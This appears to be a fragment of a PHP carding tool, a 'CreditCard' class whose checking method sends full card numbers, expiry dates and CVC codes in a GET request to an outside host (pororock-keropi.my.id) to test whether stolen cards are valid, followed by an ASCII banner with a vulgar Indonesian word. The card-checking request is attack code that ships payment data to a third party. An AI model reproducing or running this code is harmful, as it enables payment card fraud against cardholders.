...
class CreditCard extends modules
{
    ...
    public function checking($ccnum,$ccmonth,$ccyear,$cccvc){
        ...
        $headers = array();
        $headers[] = 'Connection: keep-alive';
        $getinit = $this->request("http://pororock-keropi.my.id/h3.php?cc=$ccnum|$ccmonth|$ccyear|$cccvc&key=ANAK-KECIL", null, $headers, 'GET');
...
echo " _  ______ _______ _   _  ____  _                 _   _  ____     _____ _    _          _____   _____ ______ 
| |/ / __ \__   __| \ | |/ __ \| |               | \ | |/ __ \   / ____| |  | |   /\   |  __ \ / ____|  ____|
| ' / |  | | | |  |  \| | |  | | |       ______  |  \| | |  | | | |    | |__| |  /  \  | |__) | |  __| |__   
|  <| |  | | | |  | . ` | |  | | |      |______| | . ` | |  | | | |    |  __  | / /\ \ |  _  /| | |_ |  __|  
| . \ |__| | | |  | |\  | |__| | |____           | |\  | |__| | | |____| |  | |/ ____ \| | \ \| |__| | |____ 
|_|\_\____/  |_|  |_| \_|\____/|______|          |_| \_|\____/   \_____|_|  |_/_/    \_\_|  \_\\_____|______|\n\n";
awal:
